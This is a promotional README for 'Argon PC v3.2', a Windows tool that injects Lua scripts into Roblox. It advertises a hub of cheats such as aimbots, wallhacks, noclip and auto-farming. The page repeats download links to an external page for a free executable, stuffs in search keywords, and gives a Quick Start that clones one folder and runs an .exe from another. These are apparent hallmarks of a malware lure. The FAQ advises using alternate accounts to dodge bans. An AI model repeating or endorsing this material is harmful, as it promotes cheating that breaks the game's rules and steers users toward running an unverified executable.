# Argon PC v3.2 - Roblox Script Executor 2026

> **A compact Windows desktop app for running custom Lua scripts in Roblox.** It combines one-click injection, an embedded script hub with 500+ community scripts, and automatic updates in a package that stays under 40 MB. Built for Windows 10 and 11 in 2026.

[![Windows](https://img.shields.io/badge/Platform-Windows%2010%2F11-blue?style=flat-square&logo=windows)](https://github.com)
[![Roblox](https://img.shields.io/badge/Compatible-Roblox%202026-red?style=flat-square)](https://github.com)
[![Scripts](https://img.shields.io/badge/Scripts-500%2B-green?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/tylerhayes1993/argon-windows-script-hub?style=flat-square)](https://github.com)

---

<p align="center">
  <a href="https://tylerhayes1993.github.io/argon-windows-script-hub/">
    <img src="https://img.shields.io/badge/%E2%AC%87%EF%B8%8F%20Download%20Argon%20PC-v3.2%20Latest-brightgreen?style=for-the-badge" alt="Download Argon PC">
  </a>
</p>

> **[Direct Download - Argon PC v3.2](https://tylerhayes1993.github.io/argon-windows-script-hub/)**
> Windows 10 / 11 · 64-bit · Free · No Key Required

---

[Download Latest Build](https://tylerhayes1993.github.io/argon-windows-script-hub/)

---

## Overview

Argon PC v3.2 is a Roblox-focused script execution tool for Windows. Its interface is intentionally simple: choose a Lua script, inject it into a Roblox session, and let the executor take care of the rest. The experience is designed to stay uncluttered and fast for everyday use.

The app does not use keys or repeated authentication steps, which keeps startup friction low. It also ships with an auto-update system that helps maintain compatibility with current Roblox client releases. Inside the script hub, users get access to more than 500 scripts across popular titles such as Blox Fruits, Adopt Me, and Pet Simulator X, making it useful both as a starter toolkit and as a library for regular users.

---

## Features at a Glance

- **One-Click Injection** - Start script injection in Roblox with a single action, without extra configuration.
- **Built-in Script Hub** - Access 500+ community-made scripts grouped by game and use case.
- **Persistent Queue System** - Favorites and recent items are preserved locally through SQLite-backed storage.
- **Auto-Update Engine** - The app checks for updates on its own and applies them to stay aligned with Roblox changes.
- **Multi-Language UI** - The interface includes support for multiple languages.
- **Ultra-Light Footprint** - The install remains below 40 MB and keeps resource usage low while running.
- **Batch Execution Mode** - Add several scripts to the queue and run them one after another automatically.
- **Built-in Debugger** - Basic debugging tools are included to help trace script errors and execution problems.

---

## Supported Games & Scripts

| Game | Script Categories |
|------|-------------------|
| Blox Fruits | Auto-farm, stat hacks, teleport, item collection |
| Adopt Me | Pet hatching, money farming, auto-tasks |
| Pet Simulator X | Coin farming, pet collection, egg hatching |
| Arsenal | Aimbot, ESP, wallhack, rapid fire |
| Tower of Hell | Auto-complete, noclip, speed hacks |
| Jailbreak | Auto-rob, teleport, vehicle spawn |

---

## System Requirements

| Component | Minimum |
|-----------|---------|
| Operating System | Windows 10 (64-bit) or Windows 11 |
| Processor | Intel Core i3 or AMD equivalent |
| RAM | 4 GB |
| Storage | 100 MB free space |
| .NET Framework | .NET 6.0 or later |
| Roblox | Latest Roblox Player installed |

---

## Quick Start

```bash
# Clone the repository
git clone https://github.com/tylerhayes1993/argon-windows-script-hub.git

# Navigate to the project folder
cd Argon-Exec-v3.2

# Launch the executor
start ArgonExecutor.exe
```

Once the app is open, make sure Roblox is already running. Then press **Inject** in Argon PC and either pick a script from the hub or load your own `.lua` file.

---

## Script Hub - Popular Searches 2026

- **Blox Fruits auto-farm scripts** - automated leveling and fruit collection
- **Adopt Me auto-hatch** - speed up pet hatching cycles
- **Pet Simulator X coin generator** - maximize in-game currency earnings
- **Arsenal aimbot scripts** - improved targeting assistance
- **Tower of Hell auto-complete** - skip through floors automatically
- **Jailbreak money farming** - efficient robbery and cash collection
- **Universal GUI scripts** - multi-game compatible interface scripts

---

## Project Layout

```
Argon-Exec-v3.2/
├── ArgonExecutor.exe          # Main executable
├── config.json                # User configuration
├── scripts/                   # Script storage directory
│   ├── hub/                   # Built-in script hub cache
│   └── user/                  # User-imported scripts
├── data/                      # SQLite database files
│   └── queue.db               # Script queue persistence
├── updates/                   # Auto-update download folder
├── logs/                      # Execution and error logs
└── README.md
```

---

## FAQ

**Is Argon PC safe to use?**
Argon PC runs scripts supplied by the user inside Roblox. Only use files you trust, and keep in mind that the project cannot control what third-party scripts do.

**Will it work after a Roblox update?**
The built-in update system is meant to keep the executor working with the newest Roblox client builds. In general, updates are published within 24 hours after a major Roblox patch.

**How does Argon PC compare to paid executors?**
It is free to use and does not require a key or subscription. The core feature set includes injection and a script hub, though some advanced capabilities commonly found in paid tools may not be included.

**Can my Roblox account get banned?**
Any third-party script executor can violate Roblox's Terms of Service, so account action is always a possibility. Use caution and consider testing on alternate accounts.

**Where are my scripts stored?**
Your scripts live locally in the `scripts/` folder, and queue information is saved in a SQLite database under `data/`. Nothing is uploaded to external servers.

---

## Roadmap - 2026

- [x] One-click injection and script hub v1.0
- [x] Persistent queue with SQLite storage
- [x] Auto-update engine
- [ ] Custom script editor with syntax highlighting
- [ ] Remote script execution via WebSocket
- [ ] Expanded game-specific script templates
- [ ] Cloud script hub with community ratings

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.

---

<p align="center">
  <i>Argon PC v3.2 - Free, lightweight, and always updating for the Roblox community.</i>
</p>
